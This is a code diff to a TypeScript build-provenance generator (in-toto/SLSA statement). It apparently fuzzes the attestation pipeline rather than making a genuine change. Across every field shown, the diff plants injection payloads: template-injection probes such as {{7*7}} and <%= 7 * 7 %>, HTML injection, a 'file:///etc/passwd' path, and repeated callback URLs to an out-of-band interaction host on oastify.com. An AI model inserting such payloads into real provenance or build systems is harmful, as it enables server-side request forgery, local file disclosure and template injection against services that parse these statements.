@@ -21,22 +21,22 @@ export const generateProvenance = (
     .split('@')
 
   return {
-    _type: INTOTO_STATEMENT_V1_TYPE,
+    _type: 'https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/aa',
     subject: [    {
       "name": "UPDATED{{7*7}}\"><h1>abc</h1>{{7*7}} ${7*7}<%= 7 * 7 %> ",
       "digest": {
         "sha256": "{{7*7}} <%= 7 * 7 %>${7*7} "
       }
     }],
-    predicateType: "\"><h1>sdf</h1>",
+    predicateType: "https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/bbb",
     predicate: {
       buildDefinition: {
-        buildType: GITHUB_BUILD_TYPE,
+        buildType: "https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/kfkfk",
         externalParameters: {
           workflow: {
             ref: workflowRef,
-            repository: `${env.GITHUB_SERVER_URL}UPD{{7*7}} <%= 7 * 7 %> ${7*7}ATED/${env.GITHUB_REPOSITORY}UPDA{{7*7}}${7*7} <%= 7 * 7 %> TED`,
-            path: workflowPath
+            repository: 'https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/cccjc',
+            path: 'file:///etc/passwd'
           }
         },
         internalParameters: {
@@ -48,7 +48,7 @@ export const generateProvenance = (
         },
         resolvedDependencies: [
           {
-            uri: `git+${env.GITHUB_SERVER_URL}/${env.GITHUB_REPOSITORY}UPD{{7*7}} <%= 7 * 7 %> ${7*7}ATED@${env.GITHUB_REF}UPD${7*7}{{7*7}} <%= 7 * 7 %> ATED`,
+            uri: `https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/adsfwejrweorwoeworeoo`,
             digest: {
               gitCommit: env.GITHUB_SHA
             }
@@ -57,10 +57,10 @@ export const generateProvenance = (
       },
       runDetails: {
         builder: {
-          id: `${GITHUB_BUILDER_ID_PREFIX}/${env.RUNNER_ENVIRONMENT}${7*7}`
+          id: `https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/adsfwe312323jrweorwoeworeoo`
         },
         metadata: {
-          invocationId: `${env.GITHUB_SERVER_URL}/${env.GITHUB_REPOSITORY}UPDA{{7*7}} ${7*7}<%= 7 * 7 %> TED/actions/runs/${env.GITHUB_RUN_ID}/attempts/${env.GITHUB_RUN_ATTEMPT}UPD{{7*7}} ${7*7}<%= 7 * 7 %> ATED`
+          invocationId: `https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/${env.GITHUB_REPOSITORY}UPDA{{7*7}} ${7*7}<%= 7 * 7 %> TED/actions/runs/${env.GITHUB_RUN_ID}/attempts/${env.GITHUB_RUN_ATTEMPT}UPD{{7*7}} ${7*7}<%= 7 * 7 %> ATED`
         }
       }
     }
